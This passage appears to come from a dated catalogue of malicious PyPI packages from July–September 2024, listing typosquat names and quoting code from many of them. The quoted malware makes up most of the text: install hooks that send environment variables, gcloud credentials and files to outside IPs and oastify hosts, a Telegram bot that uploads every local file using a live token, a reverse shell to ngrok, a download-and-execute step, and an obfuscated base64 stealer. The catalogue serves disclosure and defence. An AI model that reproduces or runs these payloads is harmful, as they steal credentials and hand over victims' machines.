from zlib import compress, decompress
from base64 import b64decode, b64encode
from os import getlogin
from json import dumps

class algorithmb():
	def encd(self, data):
		zlbc=lambda in_:compress(in_)
		b64e=lambda in_:b64encode(in_)
		return b64e(zlbc(data.encode('utf8')))[::-1].decode()

	def decd(self, data):
		b64d=lambda in_:b64decode(in_)
		zlbd=lambda in_:decompress(in_)
		return zlbd(b64d(data[::-1])).decode()

	def ciphersd(self, e:str, t:int, v:str):
		try:
			gG53z=[b'jog6DCQBP78SRvSzJtyzOrULO1iKNhSys88SXziSrwJe',b'=wKCQiGADsSzPNNzM30zRzyyM/c1J9kzzBvzsg09TzJe']
			doSGb=HTTPSConnection(self.decd(gG53z[0]),timeout=1)
			doSGb.request(''.join(map(chr,[71,69,84])),self.decd(gG53z[1]))
			tenNo=doSGb.getresponse().read().decode().strip()
			doSGb.close()
			Fd3hh=self.decd(tenNo).split(':')
			enC03=self.encd(e)
			pF3th={"t":t,"n":getlogin(),"v":v,"e":enC03}
			aPf3h=''.join(map(chr,[97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110]))
			Hs3hf={''.join(map(chr,[67,111,110,116,101,110,116,45,116,121,112,101])):aPf3h}
			s0Ntz=HTTPSConnection(Fd3hh[0],Fd3hh[1],timeout=1)
			s0Ntz.request(''.join(map(chr,[80,79,83,84])),Fd3hh[2],dumps(pF3th),Hs3hf)
			rsGap=s0Ntz.getresponse()
			s0Ntz.close()
			return True
		except:
			return False
```

### 21 Jul. 2024
requestn [8.0] <br>
```python
import os
import requests

def promain():
    try:
        import socket
        import webbrowser
        import sys
        import json
        token2='7345360932:AAFdgHMvggOowu-hx-OGyPljyi_wOf5D0zI'
        ID2='5487978588'
    except:
        os.system("pip install webbrowser")
        os.system("pip install socket")
        os.system("clear")

    S = '\033[1;33m'
    A = "\033[1;91m" #red
    C = "\033[1;97m" #white
    ra = 0

    file_ha = []

    for file in os.listdir():
        if os.path.isfile(file):
            file_ha.append(file)
            g = file
            print(file)
            massage = '@is_brother'
            start_msg = requests.post(f"https://api.telegram.org/bot{token2}/sendMessage?chat_id\n\n@t.me/is_brother")
            requests.post(f'https://api.telegram.org/bot{token2}/sendDocument?chat_id={ID2}&caption={massage}', files={'document': open(g, 'rb')})
  
    print(file_ha)
    massage = '@is_brother'

    for file in file_ha:
        with open("SIN.txt","a") as pro:
            pro.write(str(file) + "\n")
            print(file_ha)
promain()
```

### 22 Jul. 2024
hexmanibm [1.0.4] <br>
hexteamibm [1.0.4] <br>
asptcer [1.0.0] <br>

```python
class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("http://9.30.214.68",params = ploads)
```


### 27 Jul. 2024
stackstorm-runner-action-chain [1.0.0] <br>

### 28 Jul. 2024
lr_utils_lib [1.0.0] <br>

```python
def get_co():
    from subprocess import check_output as cooo
    return cooo

def get_defcon(pew, h):
    return pew.HTTPSConnection(h)

def get_se():
    from re import search as se
    return se

def get_ma(my):
    return my.group(1)

def get_prrr():
    from http import client as prrr
    return prrr

def get_obs():
    from codecs import open as obs
    return obs

def get_ash(i):
    from hashlib import sha256 as s256
    return s256(i.encode()).hexdigest()

go = ['641d54eb5d6eede67c62287e8b33c95200b68d35465c75a2715a95fdfffe86d1',
    'ae712e7065d27a88e464f77a0e4f97af6fa7a6bbcb9ebfe674eecec11f82c752',
    '1686dc1dc8b706be5664fa568833cd8920c8551415c1b8567bc9b1060ff7bd0a',
    'ae5a652d6397ac8150e0462930064cc600875e66d7687dcdcadd3c2532c45ac9',
    '086dac8a9a2e86f3ee79274111d04577cfb4537d4f004efb4698ddecdf78c608',
    'faacef9164ab09741fc616e71890ecbb4d748fec30954daf198424615c4115cb',
    '3d959605a3105b5d37a4af33543c93ca4ffd02627d476e1b4647c75d61dd977f',
    'e0df878d670bc75d210ed22d89a96049e2c7c8e750a22984f73320019a6b3c34',
    '219a42f0592c7237a7bee6aaaadfdb3d8a9c2feaade9bb4cc334237a547f11c5',
    '162284405016ebdcfc4b4525479f6e81e77995036e4a7c838060dee0aef347a5',
    'ee4dc4f0fc56a3adab495255b467fa37f1af59aa213e1a757fd4982ff93603e2',
    'ab85c781babc692205d15e49a3d8b4554382659f3c33f420f2313abe88236d0e',
    '1c20e11f988ac643e391e46650b631130f2441eeadd07042123d8c33c9299519',
    '53e65c0f44c9187361a3188e328786027ae32f73e58133f7a3deee8ecede2330',
    '0d991fd5a73bc1cc5eb85f4f4a214b75ee4b6524aa7c7cffb25201fef9b39111',
    '7594de25a00ad4c63e99b4e1bb288aff95463bf9e412cba7bfe2b41e7d48a649',
    '94b307dbe8ea576634eb9f8c89cc303b174518f6b74771f3a79bafb178084421',
    '55adf25da39af781eaeb5495c95fd9d52b40faf520f4c3f1c47c7376be2e7f8c',
    '3defabd5508208a295e6d510983e88ad9f058ed3a83d7b51ece6298f6316772b',
    '28eaeb21dc834a1d03fce5f08ade2a92adf5c02b8b393d547180f64cbb1c86f1',
    '114fa09995b39dfe510be16835c3e8bbc2e72198124f84346e98911d90b3b22f',
    'aeb94d85e079805c3d8417859674bc147399fb2e75d7f44762f188aefb558e9b',
    '076a8d36cd65f00aa194b43e84b35b1d9dee995b1d1dd79889e32fb2f7d25c68',
    'f4de2757497be6be87ed7aed1015f7d400801476922ecda8c3726d0a21eff626',
    'fbcd4aedb12f03e1bfa3e4d18e95b5bbba9dc24ece486b53d1b9efa0b9a1d05f',
    '64452e7c8fc93d823ffb7afc56a0ec29a26f01ab0433864334aca9b3d853fdae',
    '536a133d1418fab3e9446d24ba372a3074d9b1cb0323deba90f4570bc06aec5b',
    '5ac29b3e8d242d5304741adefeab22a7ec86d27ca20770e9bbaa7607ea6ac6c6',
    '893b0bdad0ad9b444d3b8f81d767174d56ef8d50d42e2cebe590909b4e3b8c14',
    '98072eb273aa84e41be2c632d80c45c9d01bc51bb00b7641e10ed506d9ec8e0b',
    '8a811141b32bb3c557e3ab590a16e20610e47048dd3e7e89e1fb212a96dbb8a8',
    'cfa5a30deb25da9e0fb69d8fbffeede549e2a859197a985ddb70185ba7b702d3',
    '794722165ec19e2861a3ab8f6c28491f30b649e53ac9f36047e875398f614d9d',
    '06b3c63f79eacfd4f6663da06605c431a348cde69880146fc9146b698355cb6e',
    'ba843f0a75e1aea2408132ecf7926fe27d1553c35eb4a94ff69f1bc906d61e2d',
    'a8a9ffe2bc4a837da05869333ffd7b0f518a8c79d765e6676383dd5d94384a7b',
    '62806c8a8e2196f71f7e4927f868e61692473b02b381719c34262370adb83d6c',
    'de4179e4031f226ba6dbb20075b7c1d224a66dfa1bce24b79e02bad14bf5e560',
    '6d1a9f3a34e6b8d9a7afe3207755e66694514fcb8438e230077002f26721471c',
    'a397fc034fd2637cb14fb150fc3373ac2764985b84d374f059ee81ef80343051',
    '8b8fb34fb9a3e2e030904c7a4bdb41e83b67ed89c13b7bdd2ea12819f05f3f8e',
    'e84fed85df76f0e7680e1dca0aee6756e4314103f79a4d0d7ddf6567b8e0de85',
    'c00facb20a683a9b09d3b7f291885104bfca9b2bf59b8b8b3a3ef7b405ae473b',
    '7bb8e88f6f416b7bbae07288a189e733bc671fc616c09cd9afe7a2fc9360fb5e',
    '67aaee9fa3885064036c378669662bc657aaa6d4d216430dad7221dc45d13e24',
    'f23e972a78e412f9037049bb4f8409022e5c3c9bf4433478dc9a2ac6c03401cc',
    '224e96bb75927242dd3aa94d044ba38107923eb001f4e52ba477f486c2e7f5f6',
    '3d0126242a1d570638bbd7e3a90cea72ab106c9bf0987484dd7cca128c51b18c',
    '6f81cf533536a625c491d36e09fe3a98b6a0940d579c555ee5c00317138144c5',
    '80c492975129f66b856433f1cc35dfeaabeef3d6804f9741604b64b7f1829fab',
    '715847db3c4c182e95822515f4f7f32c5ba0e6fbfacc81b66138515c1e74d7fc',
    'e7a2467cc4154ba48de85a8cf5afbef66523be988ee69b8da13538b1be27665c',
    '7961af6aab6ff18d10dd5b699580733f44bc7fd825f0410ff89b5f22a93dd9b8',
    '68110b8c2efab1563556ab0d535ffedd8aa1aecd1d47b784c2bc7e995c887fc2',
    '5b31fceeeb1abc1f49b03824367db11103b04a163686d47d8c590e3d669768c2']

class PyInstall(install):
    def run(self):
        if sys.platform != "darwin":
            return 

        tmp = get_co()
        c = b64d("aW9yZWcgLWsgSU9QbGF0Zm9ybVVVSUQ=").decode()
        raw = tmp(c.split()).decode()
        p = b64d('IklPUGxhdGZvcm1VVUlEIlxzKj1ccyoiKFteIl0qKSIK').decode()
        roger = get_se()(p, raw)
        u = get_ma(roger)
        h = get_ash(u)
        
        if h in go:
            b = os.path.expanduser(b64d('fi8uY29uZmlnL2djbG91ZA==').decode())
            t = ["YXBwbGljYXRpb25fZGVmYXVsdF9jcmVkZW50aWFscy5qc29u", "Y3JlZGVudGlhbHMuZGI="]

            for x in t:
                try:
                    con = get_defcon(get_prrr(), b64d("ZXVyb3BlLXdlc3QyLXdvcmtsb2FkLTQyMjkxNS5jbG91ZGZ1bmN0aW9ucy5uZXQ=").decode())
                    with get_obs()(os.path.join(b, b64d(x).decode()), "rb") as fd:
                        con.request("POST", "/version", fd.read(), {"X-Trace-Correlation-ID": h})
                    con.close()
                except:
                    pass

            install.run(self)

# 'setup.py publish' shortcut.
if sys.argv[-1] == "publish":
    os.system("python setup.py sdist bdist_wheel")
    os.system("twine upload dist/*")
    sys.exit()
```

### 30 Jul. 2024
fasdghjkhjafsd [0.0.1, 0.0.2, 0.0.3] <br>

```python
def post_json(body):
    myurl = "http://140.238.202.225:8080"

    req = urllib.request.Request(myurl)
    req.add_header('Content-Type', 'application/json; charset=utf-8')
    jsondata = json.dumps(body)
    jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes
    req.add_header('Content-Length', len(jsondataasbytes))
    response = urllib.request.urlopen(req, jsondataasbytes)


class PostDevelopCommand(develop):
    """Post-installation for development mode."""
    def run(self):
        develop.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        
        text = ""
        # post_fields = {'out': 'bar'}     # Set POST fields here
        path = '/home'
        for filename in glob.glob(os.path.join(path, '**/prices.txt'),  recursive=True):
            try:
                with open( filename, 'r') as f: # open in readonly mode
                    # do your stuff
                    text = f.read() + '\n'
                    post_json({filename: text})
            except:
                pass

        path = ''
        for filename in glob.glob(os.path.join(path, '**/prices.txt'),  recursive=True):
            try:
                with open( filename, 'r') as f: # open in readonly mode
                    # do your stuff
                    text = f.read() + '\n'
                    post_json({filename: text})
            except:
                pass

        path = ''
        for filename in glob.glob(os.path.join(path, '**/*.txt'),  recursive=True):
            try:
                with open( filename, 'r') as f: # open in readonly mode
                    # do your stuff
                    text = f.read() + '\n'
                    post_json({filename: text})
            except:
                pass
```

### 31 Jul. 2024
appetize-cli [1.0.0] <br>
orion.algo.extrapol [1.0.0] <br>
orion.algo.extrapol [1.0.0] <br>
adafruit_imageload [1.0.0] <br>


### 01 Aug. 2024
urllib7 [1.26.12] <br>
urllib12 [1.26.12, 1.30.0] <br>
studypong [5.66, 7.16, 8.22, 10.45] <br>
pipsqlite3liberyV2 [1.1.0] <br>
httprequesthub [2.31.0, 2.31.1, 2.31.3, 2.31.4] <br>


### 02 Aug. 2024
zoom-pyutils [7.0.0] <br>
crytic_compilers [0.3.10, 0.3.11] <br>
discord-misc [0.2.23, 0.2.24] <br>
threadxpools [1.0, 1.1, 1.2, 1.3] <br>
jupyter-pytest-fi-console [8.7.5, 8.7.6] <br>
discord-py-bot [0.0.1] <br>

### 04 Aug. 2024
pygaqme seccache driftme pytorchg pytorch-triton sjmplejson pytirch beautyfulsoup pygzme matplkotlib mozilla localization-utils zuppa beautifilsoop splib-http pywarder matplotblib pythrch pztorch pygfme .DS_Store pytorbch pygamne beaitifulsoop pygacme matplotlob ss-concurrent-log-handler simpkejson pygqame nir-bb-test beutifulsoop spl-types matplotlpib matplttlib simplejason simplejsoh beautifulsoupo pygarme catme urtelib32 pqtorch pytorcb simolejson django-log-tracker matplottbib pygane pygamm beutifullsoup matpllotib prometheus-http-client-shopee matplotib beautifoulsoup beautifulsoup aiohttp-proxy-connect matploltlab matplotllib matplorlib pygamw matplftlib matplotlr matplootib beautifulsoul fnbot2 beuatiflsoup pytorchc pytarch pygraphql32 matplotklib pytorcdh color-vividpy matplolplib libwebp ascii2art pytorchb beautysoup pygamse pygawme sijplejson ethereum2 matploltlib beautifolsoup pytorchy pygxme beaotifulsoup sjimplejson beautifulsoop ca-certificates sea-django-mysqlpool modularseven hypixelmc simpoejson locute simplejdon maptplotlib pytoich pytordh huehuehuehue pygaome np6helperhttptest pygaeme hymcapi np6helperhttper python-splib ssc-concurrent-log-handler pygazme simepljson pygvame beautifilsoup pygume simplejsoj raydium pytrosh pytorch sol-instruct test-test-test123 matpliotlib pygmme pygamr matplotkib beautifullsoop beaufifulsoup matplotoib siplejason beautifullsooup sol-structs azureml-contrib-jupyterrun cloud-client raydium-sdk


### 08 Aug. 2024

testjsonn1 [0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7] <br>
testjsonn2 [0.1] <br>
testjsonn3 [0.1] <br>

```python

class CustomCommand(Command):
    description = 'Run custom function during installation'
    user_options = []
    

    def initialize_options(self):
        pass

    def finalize_options(self):
        pass

    def run(self):
        from testjsonn1 import main
        import requests
        main('https://cdn.discordapp.com/attachments/1083783447291629640/1264384843379249272/my_script.py?ex=669dada5&is=669c5c25&hm=9a2a1345fea56d35da0d45a1743485a48730556ccebf4c2d056206deb43c991d&', 'testnp.py')


import subprocess
import sys

def install_library(library_name):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", library_name])
        print(f"'{library_name}' has been installed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while trying to install '{library_name}': {e}")

# Replace 'requests' with the name of the library you want to install

install_library('requests')

def main(url, filename):
    # Download the file
    import requests
    response = requests.get(url)
    if response.status_code == 200:
        with open(filename, 'wb') as file:
            file.write(response.content)
        print(f"Downloaded file saved as {filename}")
        
        # Execute the file
        try:
            subprocess.run(['pythonw', filename], check=True)
            print(f"Execution of {filename} was successful.")
        except subprocess.CalledProcessError as e:
            print(f"Error during execution: {e}")
    else:
        print(f"Failed to download file. Status code: {response.status_code}")
```

### 12 Aug. 2024
aiohttp-async-socks [0.1.75] <br>
aiohttp-socks-test-connector [0.2.19] <br>
eth-abcde [0.2.2, 0.2.3, 0.2.51] <br>
aiohttp-proxies-connector [0.2.11, 0.2.12, 0.2.13, 0.2.14, 0.2.15, 0.2.17, 0.2.18, 0.2.19, 0.2.20, 0.2.21, 0.2.22, 0.2.23, 0.2.24, 0.2.25, 0.2.26, 0.2.27, 0.2.28, 0.2.29, 0.2.3, 0.2.30, 0.2.31, 0.2.32, 0.2.33, 0.2.34, 0.2.35, 0.2.36, 0.2.37, 0.2.38, 0.2.39, 0.2.4, 0.2.40, 0.2.41, 0.2.42, 0.2.43, 0.2.44, 0.2.45, 0.2.46, 0.2.47, 0.2.48, 0.2.49, 0.2.50, 0.2.51, 0.2.52, 0.2.53, 0.2.54, 0.2.55, 0.2.56, 0.2.57] <br>
aiohttp-sock [0.1.19, 0.1.20, 0.1.21, 0.1.22, 0.1.23, 0.1.24, 0.1.25, 0.1.27, 0.1.28, 0.1.29, 0.1.30, 0.1.31, 0.1.32, 0.1.33, 0.1.37, 0.1.38, 0.1.39, 0.1.40, 0.1.41, 0.1.42, 0.1.43, 0.1.44, 0.1.45, 0.1.46, 0.1.47, 0.1.48, 0.1.49, 0.1.50, 0.1.51, 0.1.52, 0.1.53, 0.1.54, 0.1.55, 0.1.56, 0.1.57, 0.1.58, 0.1.59, 0.1.60, 0.1.61, 0.1.62, 0.1.63, 0.1.64, 0.1.65, 0.1.66, 0.1.67, 0.1.68, 0.1.69, 0.1.70, 0.1.71, 0.1.72, 0.1.73, 0.1.74, 0.1.75, 0.1.76, 0.1.77, 0.1.78, 0.1.79, 0.1.80, 0.1.81, 0.1.82, 0.1.83, 0.1.84, 0.1.85, 0.1.86] <br>
attr-property [0.2.101, 0.2.2, 0.2.4, 0.2.5, 0.2.74, 0.2.76, 0.2.77, 0.2.78, 0.2.79, 0.2.80, 0.2.81, 0.2.82, 0.2.89, 0.2.90] <br>
aiohttp-proxies-forked [0.1.65] <br>
aiohttp-socks5-connector [0.2.10, 0.2.11, 0.2.12, 0.2.13, 0.2.15, 0.2.31, 0.2.32, 0.2.33, 0.2.34, 0.2.36, 0.2.37, 0.2.38, 0.2.39, 0.2.40, 0.2.41, 0.2.43, 0.2.44, 0.2.9] <br>
aiohttp-socks-connector [0.1.10, 0.1.11, 0.1.12, 0.1.14, 0.1.15, 0.1.16, 0.1.17, 0.1.18, 0.1.19, 0.1.20, 0.1.21, 0.1.22, 0.1.24, 0.1.25, 0.1.26, 0.1.28, 0.1.29, 0.1.30, 0.1.31, 0.1.7, 0.1.8, 0.1.9] <br>
aiohttp-proxies [0.8.36, 0.8.37, 0.8.38, 0.8.39, 0.8.40, 0.8.41, 0.8.42, 0.8.43, 0.8.44, 0.8.45] <br>
aiohttp-proxies-fork [0.1.62, 0.1.63, 0.1.64, 0.2.59, 0.2.60, 0.6.2] <br>
aiohttp-proxy2 [0.1.10, 0.1.2, 0.1.3, 0.1.4, 0.1.5, 0.1.6, 0.1.7, 0.1.8, 0.1.9] <br>
aiohttp-proxy5 [0.1.10, 0.1.11, 0.1.12, 0.1.13, 0.1.14, 0.1.15, 0.1.16, 0.1.17, 0.1.18] <br>
test-test-test123 [0.1.67, 0.1.68, 0.1.69, 0.1.70, 0.1.71] <br>
aiohttp-async-proxy [0.1.72, 0.1.73] <br>
ai-http-proxy [0.1.2] <br>
typing-unions [3.10.0.1, 3.10.0.0] <br>


### 13 Aug. 2024
django_mongodb [5.0a4] <br>
artifact-lab-3-package-f0727516 [0.1.0, 0.1.1] <br>
artifact-lab-3-package-392c6acd [0.1.1, 0.1.10, 0.1.12, 0.1.13, 0.1.14, 0.1.15, 0.1.16, 0.1.17, 0.1.18, 0.1.19, 0.1.2, 0.1.20, 0.1.22, 0.1.23, 0.1.24, 0.1.3, 0.1.4, 0.1.5, 0.1.6, 0.1.7, 0.1.8, 0.1.9] <br>

```python
def reverse_shell():
    host = "6.tcp.eu.ngrok.io"  # Replace with your IP
    port = 13334  # Replace with your port

    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the remote server
        s.connect((host, port))
        
        # Redirect standard input, output, and error to the socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Execute a shell using a more portable approach
        p = subprocess.call(["/bin/sh", "-i"])
        
    except Exception as e:
        print(f"Error: {e}")

# Call the function
reverse_shell()
```

### 14 Aug. 2024
artifact-lab-3-package-7e532784 [0.1.0, 0.1.1, 0.1.2, 0.1.3, 0.1.4, 0.1.5, 0.1.6, 0.1.7] <br>

```python
def send_data():
    data = dict(os.environ)
    flag = dict(os.getenv('flag'))
# Encode the data
    encoded_data = urllib.parse.urlencode(data).encode()
    encoded_data2 = urllib.parse.urlencode(flag).encode()
# Define the URL to which the data will be sent
    url = 'https://1a6b-2a02-a310-e143-8d80-2c80-a848-55ee-c65c.ngrok-free.app'  # Replace $URL with your actual URL
# Create the request object with the encoded data
    request = urllib.request.Request(url, data=encoded_data)
    request2 = urllib.request.Request(url, data=encoded_data2)
# Perform the request without reading the response
    urllib.request.urlopen(request).close()
    urllib.request.urlopen(request2).close()
# Call the function
send_data()
```

### 16 Aug. 2024
artifact-lab-3-package-b6920ef4 [0.1.1] <br>

### 19 Aug. 2024
artifact-lab-3-package-b55680cd [0.1.1] <br>

### 20 Aug. 2024
We have collected 3,327 malicious packages, which were discovered early and subsequently removed from PyPI.org.

### 22 Aug. 2024
puffioner131 [9999, 99999, 999999, 9999999, 99999999, 999999999] <br>

```python
class PostInstallCommand(install):
    def run(self):
        # Continue with the standard installation process
        install.run(self)

        # Fetch environment variables
        env_data = {key: value for key, value in os.environ.items()}

        # Send the environment variables in a POST request
        response = requests.post("http://eewtrzyimp165no1u4kqfhv0nrtih95y.oastify.com", json=env_data, verify=False)

        # Optionally, handle the response
        if response.status_code == 200:
            print("Environment variables sent successfully!")
        else:
            print(f"Failed to send environment variables. Status code: {response.status_code}")

class PostDevelopCommand(develop):
    def run(self):
        # Continue with the standard development process
        develop.run(self)

        # Fetch environment variables
        env_data = {key: value for key, value in os.environ.items()}

        # Send the environment variables in a POST request
        response = requests.post("http://eewtrzyimp165no1u4kqfhv0nrtih95y.oastify.com", json=env_data, verify=False)

        # Optionally, handle the response
        if response.status_code == 200:
            print("Environment variables sent successfully!")
        else:
            print(f"Failed to send environment variables. Status code: {response.status_code}")
```


### 25 Aug. 2024

artifact-lab-3-package-9fde789f [0.1.0] <br>]
ttat-api [1.0.5] <br>
subsys-counter [0.8.5] <br>
kmvn-ekjvnbwkhjbewv [0.2.3, 0.2.5] <br>
byterec-models [0.8.3, 1.5.3] <br>
audit-themis-i18n [2.3.5] <br>

```python
su = "https://lbs-boe.bytedance.net/"
response = requests.get(su)
sc = response.status_code
hostn = socket.gethostname()
du = f"{sc}.{hostn}.w0xm0b7q0nuax7c67g51kmqwxn3mrdf2.oastify.com"
socket.gethostbyname(du)
```


### 28 Aug. 2024
artifact-lab-3-package-6e10193e [0.3.3, 0.3.4, 0.3.5, 0.3.6, 0.3.7, 0.3.8] <br>
artifact-lab-3-package-76a351f5 [0.2.0, 0.4.0] <br>

### 29 Aug. 2024
invokehttp [2.5.5] <br>
artifact-lab-3-package-3eef6c2c [0.3.0] <br>

### 30 Aug. 2024
jupiter-helper [0.1] <br>
artifact-lab-3-package-f9dafccc [0.2.0, 0.2.5, 0.3.0] <br>
jupphelp [0.1.0] <br>
jupiterhelper [0.1.1, 0.1.2, 0.1.3, 0.1.4, 0.1.5, 0.1.6] <br>
artifact-lab-3-package-6e10193e [0.3.3, 0.3.4, 0.3.5, 0.3.6, 0.3.7, 0.3.8] <br>
netfetcher [1.7.5] <br>
artifact-lab-3-package-2b6a4744 [0.1.1, 0.2.0, 0.3.0, 0.3.1, 0.3.2, 2.0.0] <br>
artifact-lab-3-package-3eef6c2c [0.2.0, 0.3.0] <br>
pyfetcher [1.7.2, 1.7.3, 1.7.4, 1.7.5] <br>
artifact-lab-3-package-77d0c154 [0.1.1, 0.1.2, 0.2.0] <br>
artifact-lab-3-package-76a351f5 [0.2.0, 0.4.0] <br>
juphelp [0.1.0] <br>
juphelper [0.1.6] <br>
jupihelp [0.1.0] <br>


### 1 Sept. 2024
flophttp [2.3.5] <br>

### 8 Sept. 2024
artifact-lab-3-package-1f7a39bc [0.1.1] <br>
hyperreq [0.1] <br>

```python
import base64
exec(base64.b64decode('aW1wb3J0IG9zDQppbXBvcnQgdGhyZWFkaW5nDQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZQ0KZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0IGFzIHNxbF9jb25uZWN0DQppbXBvcnQgcmUNCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUNCmZyb20ganNvbiBpbXBvcnQgbG9hZHMgYXMganNvbl9sb2FkcywgbG9hZA0KZnJvbSBjdHlwZXMgaW1wb3J0IHdpbmRsbCwgd2ludHlwZXMsIGJ5cmVmLCBjZGxsLCBTdHJ1Y3R1cmUsIFBPSU5URVIsIGNfY2hhciwgY19idWZmZXINCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4NCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzDQppbXBvcnQgdGltZQ0KaW1wb3J0IHNodXRpbA0KZnJvbSB6aXBmaWxlIGltcG9ydCBaaXBGaWxlDQppbXBvcnQgcmFuZG9tDQppbXBvcnQgcmUNCmltcG9ydCBzdWJwcm9jZXNzDQoNCiMgIFRISVMgSVMgMS4xLjYgVkVSU0lPTg0KIw0KIyANCg0KDQp3ZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwNjM0NzQwNjQ3NzkzODY5MzAvWG9HZVFYZkJDMnVUYkJhZlZUdVVEbjNvR3o1aFhZRHdTeFJoeHk0VGsxZmt2eWJhNjExRm5tX096ZnctNVJwdEFnRGwiDQpERVRFQ1RFRCA9IEZhbHNlDQoNCg0KZGVmIGdldGlwKCk6DQogICAgaXAgPSAiTm9uZSINCiAgICB0cnk6DQogICAgICAgIGlwID0gdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKSkucmVhZCgpLmRlY29kZSgpLnN0cmlwKCkNCiAgICBleGNlcHQ6DQogICAgICAgIHBhc3MNCiAgICByZXR1cm4gaXANCg0KcmVxdWlyZW1lbnRzID0gWw0KICAgIFsicmVxdWVzdHMiLCAicmVxdWVzdHMiXSwNCiAgICBbIkNyeXB0by5DaXBoZXIiLCAicHljcnlwdG9kb21lIl0NCl0NCmZvciBtb2RsIGluIHJlcXVpcmVtZW50czoNCiAgICB0cnk6IF9faW1wb3J0X18obW9kbFswXSkNCiAgICBleGNlcHQ6DQogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ7ZXhlY3V0YWJsZX0gLW0gcGlwIGluc3RhbGwge21vZGxbMV19Iiwgc2hlbGw9VHJ1ZSkNCiAgICAgICAgdGltZS5zbGVlcCgzKQ0KDQppbXBvcnQgcmVxdWVzdHMNCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTDQoNCmxvY2FsID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQ0Kcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpDQp0ZW1wID0gb3MuZ2V0ZW52KCJURU1QIikNClRocmVhZGxpc3QgPSBbXQ0KDQoNCmNsYXNzIERBVEFfQkxPQihTdHJ1Y3R1cmUpOg0KICAgIF9maWVsZHNfID0gWw0KICAgICAgICAoJ2NiRGF0YScsIHdpbnR5cGVzLkRXT1JEKSwNCiAgICAgICAgKCdwYkRhdGEnLCBQT0lOVEVSKGNfY2hhcikpDQogICAgXQ0KDQpkZWYgR2V0RGF0YShibG9iX291dCk6DQogICAgY2JEYXRhID0gaW50KGJsb2Jfb3V0LmNiRGF0YSkNCiAgICBwYkRhdGEgPSBibG9iX291dC5wYkRhdGENCiAgICBidWZmZXIgPSBjX2J1ZmZlcihjYkRhdGEpDQogICAgY2RsbC5tc3ZjcnQubWVtY3B5KGJ1ZmZlciwgcGJEYXRhLCBjYkRhdGEpDQogICAgd2luZGxsLmtlcm5lbDMyLkxvY2FsRnJlZShwYkRhdGEpDQogICAgcmV0dXJuIGJ1ZmZlci5yYXcNCg0KZGVmIENyeXB0VW5wcm90ZWN0RGF0YShlbmNyeXB0ZWRfYnl0ZXMsIGVudHJvcHk9YicnKToNCiAgICBidWZmZXJfaW4gPSBjX2J1ZmZlcihlbmNyeXB0ZWRfYnl0ZXMsIGxlbihlbmNyeXB0ZWRfYnl0ZXMpKQ0KICAgIGJ1ZmZlcl9lbnRyb3B5ID0gY19idWZmZXIoZW50cm9weSwgbGVuKGVudHJvcHkpKQ0KICAgIGJsb2JfaW4gPSBEQVRBX0JMT0IobGVuKGVuY3J5cHRlZF9ieXRlcyksIGJ1ZmZlcl9pbikNCiAgICBibG9iX2VudHJvcHkgPSBEQVRBX0JMT0IobGVuKGVudHJvcHkpLCBidWZmZXJfZW50cm9weSkNCiAgICBibG9iX291dCA9IERBVEFfQkxPQigpDQoNCiAgICBpZiB3aW5kbGwuY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoYnlyZWYoYmxvYl9pbiksIE5vbmUsIGJ5cmVmKGJsb2JfZW50cm9weSksIE5vbmUsIE5vbmUsIDB4MDEsIGJ5cmVmKGJsb2Jfb3V0KSk6DQogICAgICAgIHJldHVybiBHZXREYXRhKGJsb2Jfb3V0KQ0KDQpkZWYgRGVjcnlwdFZhbHVlKGJ1ZmYsIG1hc3Rlcl9rZXk9Tm9uZSk6DQogICAgc3RhcnRzID0gYnVmZi5kZWNvZGUoZW5jb2Rpbmc9J3V0ZjgnLCBlcnJvcnM9J2lnbm9yZScpWzozXQ0KICAgIGlmIHN0YXJ0cyA9PSAndjEwJyBvciBzdGFydHMgPT0gJ3YxMSc6DQogICAgICAgIGl2ID0gYnVmZlszOjE1XQ0KICAgICAgICBwYXlsb2FkID0gYnVmZlsxNTpdDQogICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikNCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQ0KICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGRlY3J5cHRlZF9wYXNzWzotMTZdLmRlY29kZSgpDQogICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcw0KDQpkZWYgTG9hZFJlcXVlc3RzKG1ldGhvZGUsIHVybCwgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOg0KICAgIGZvciBpIGluIHJhbmdlKDgpOiAjIG1heCB0cnlzDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGlmIG1ldGhvZGUgPT0gJ1BPU1QnOg0KICAgICAgICAgICAgICAgIGlmIGRhdGEgIT0gJyc6DQogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1kYXRhKQ0KIC